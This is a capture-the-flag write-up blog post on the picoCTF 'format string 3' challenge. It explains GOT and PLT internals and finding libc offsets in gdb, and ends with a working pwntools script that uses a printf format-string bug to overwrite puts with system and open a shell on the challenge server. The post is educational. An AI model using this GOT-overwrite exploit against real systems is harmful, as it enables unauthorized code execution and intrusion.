---
layout: post
title:  Overwriting entries in the Global Offset Table
categories: write-ups
comments: true
excerpt: "Learning about overwriting GOT entries using the picoCTF format string 3 challenge."
---
<br>
<p>
<h2>Overwriting entries in the Global Offset Table using a vulnerable printf function</h2>
This write-up builds on what was learned about exploiting printf vulnerabilities in my write-up on the picoCTF <a href="/write-ups/2024/12/22/format-string-exploitation.html">format string 2</a> challenge. In the format string 3 challenge there is a similar vulnerability, but this time instead of overwriting a variable within the program it will be used to overwrite a pointer to an entry in the Global Offset Table so that it will call a different libc function.
</p>
<br>
<ol>
<a href="#format-string-3"><li>format string 3</li></a>
<a href="#got"><li>The GOT, PLT, and GOT.PLT</li></a>
<a href="#exploit"><li>The Final Exploit</li></a>
</ol>

<div id="format-string-3" class="section-link">
<h2>format string 3</h2>
<p>When the program is run, it prints a line which leaks the address of the GOT entry for the <b>setvbuf</b> function and then waits for input:<br><br>
<img src="https://raw.githubusercontent.com/tlkroll/got-overwrite/refs/heads/main/fs3-1.png">
</p>
<p>
After supplying some input, it then prints two lines; one which repeats the input and another which prints <b>/bin/sh</b>:<br><br>
<img src="https://raw.githubusercontent.com/tlkroll/got-overwrite/refs/heads/main/fs3-2.png">
</p>
<p>
Here is the source code for this function:<br>
{% highlight ruby %}
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);

	puts(normal_string);

	return 0;
}
{% endhighlight %}
</p>
<p>
Looking at the source, we can identify two goals. The main objective will be to overwrite the pointer to the <b>puts</b> function with a pointer to the <b>system</b> function so that instead of printing <b>/bin/sh</b>, the program will make a <b>system</b> call to <b>/bin/sh</b> instead, granting us a shell. To accomplish this, we will need to exploit the vulnerable printf function which repeats user input.
</p>
</div>

<div id="got" class="section-link">
<h2>The Global Offset Table</h2>
<p>My understanding of the GOT is that it is a copy of libc used by a program which is stored in a random memory location at runtime in order to prevent the type of attack we are performing here. But because we have access to the copy of libc being used and the location of <b>setvbuf</b> has been leaked, we are able to calculate offsets and find the memory locations of other functions within libc.<br><br>
Finding the locations of functions and calculating their offsets can all be accomplished using pwntools, but I wanted to know exactly what was going on under the hood, so I took a look at the libc file which was supplied with this challenge. First, I used the <b>readelf</b> function to find the location of <b>setvbuf</b>:<br><br>
<img src="https://raw.githubusercontent.com/tlkroll/got-overwrite/refs/heads/main/fs3-4.png">
</p>
<p>
Then, I found the location of <b>system</b>:<br><br>
<img src="https://raw.githubusercontent.com/tlkroll/got-overwrite/refs/heads/main/fs3-5.png">
</p>
<p>
Finally, I found the difference of the two, which is <b>2ac90</b>:<br><br>
<img src="https://raw.githubusercontent.com/tlkroll/got-overwrite/refs/heads/main/fs3-6.jpg">
</p>
<p>
To test this theory, I ran the program in gdb and set a breakpoint after the <b>setvbuf</b> leak:<br><br>
<img src="https://raw.githubusercontent.com/tlkroll/got-overwrite/refs/heads/main/fs3-7.png">
</p>
<p>
Then I subtracted the <b>2ac90</b> offset from the leaked address and looked at the memory in that location:<br><br>
<img src="https://raw.githubusercontent.com/tlkroll/got-overwrite/refs/heads/main/fs3-8.png">
</p>
<p>
Cool! We've found the location of the <b>system</b> call in memory! Now what points to the <b>puts</b> entry we want to replace?
</p>
<h2>The GOT, PLT, and GOT.PLT</h2>
<h3>GOT</h3>
<p>As previously mentioned, the Global Offset Table (GOT) is a copy of libc stored in a random location in memory. The location of these addresses must be found at runtime, which is why the setvbuf leak in this program is so valuable.
</p>
<h3>PLT</h3>
<p>The Procedure Linkage Table (PLT) is where libc functions are referenced locally in this program. In this example, <b>puts</b> is located at <b>0x401080</b>:<br><br>
<img src="https://raw.githubusercontent.com/tlkroll/got-overwrite/refs/heads/main/puts2.png">
</p>
<h3>GOT.PLT</h3>
<p>This is the middle-man where the libc functions which are called locally are linked to the GOT. Here we can see the <b>got.plt</b> entry by examining the instructions following the local call. Looking at the memory in this location you can see the GOT address for <b>puts</b>:<br><br>
<img src="https://raw.githubusercontent.com/tlkroll/got-overwrite/refs/heads/main/fs3-12.png">
</p>
<p>
Now all we need to do is overwrite this entry with the offset we calculated earlier (the address for <b>system</b> is different because this is a different instance from earlier):<br><br>
<img src="https://raw.githubusercontent.com/tlkroll/got-overwrite/refs/heads/main/fs3-13.png">
</p>
<p>
And after some bugginess, we have a shell!<br><br>
<img src="https://raw.githubusercontent.com/tlkroll/got-overwrite/refs/heads/main/fs3-14.png">
</p>
<p>
Entering an <b>ls</b> command shows the contents of the local directory where I was working:<br><br>
<img src="https://raw.githubusercontent.com/tlkroll/got-overwrite/refs/heads/main/fs3-15.png">
</p>
<p>
I believe the errors in the above examples are from the breakpoints I set to examine memory. Unfortunately, because of the dynamic locations which are generated every time the program is run and the fact that the payload can not be crafted manually and sent to the program beforehand, a script must be used to complete this challenge. But at least we have a solid grasp of what is going on behind the scenes.
</p>
</div>

<div id="exploit" class="section-link">
<h2>Final Exploit</h2>
<p>I won't go over the breakdown of the printf vulnerability because I already covered that in my <a href="/write-ups/2024/12/22/format-string-exploitation.html">format string 2</a> write-up, but I used those methods to determine that our printf string is in location 38. Using all of the information we have so far, here is the script I used, adapted from Wiebe Willems's script <a href="https://blog.nviso.eu/2024/05/23/format-string-exploitation-a-hands-on-exploration-for-linux/" target="_blank">here</a>:<br>
{% highlight ruby %}
from pwn import *

libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

exe = ELF("./format-string-3") # these 3 lines set up for local execution
context.binary = exe
elf = context.binary = ELF('./format-string-3')

# p = process([exe.path]) # for local execution
p = remote("rhea.picoctf.net", 64162) # for remote execution
        

def main():

    info(p.recvline())              # receives howdy gamers line
    info(p.recvuntil("libc: "))     # receives until setvbuf address
    
    setvbuf_address = p.recvline()  # gets setvbuf address

    setvbuf_value = int(setvbuf_address.split(b"x")[1].strip(),16) # converts input to integer value for calculation

    libc.address = setvbuf_value - libc.symbols['setvbuf'] # calculate libc base address

    payload = fmtstr_payload(38, {elf.got['puts'] : libc.symbols['system']}) # format string payload; overwrites puts with system

    p.sendline(payload)
    p.clean()
    p.interactive() # gives program control back to user

if __name__ == "__main__":
    main()
{% endhighlight %}
</p>
</div>

<p>
After running this script we have a shell on the remote server and can just cat the flag.txt file!<br>
(I wasn't able to do this in the picoCTF webshell and had to use a Kali VM)<br><br>
I hope this was helpful. This challenge was a great way to learn about the Global Offset Table and also get some practice with gdb and pwntools. Reverse engineering and binary exploitation are the most fun things I have learned about so far on my cybersecurity journey!
</p>

{% if page.comments %} 

<br><br>
<p>
<div id="disqus_thread"></div>
<script>
    (function() { 
        var d = document, s = d.createElement('script');
        
        s.src = 'https://tlkroll.disqus.com/embed.js';
        
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
</p>

{% endif %} 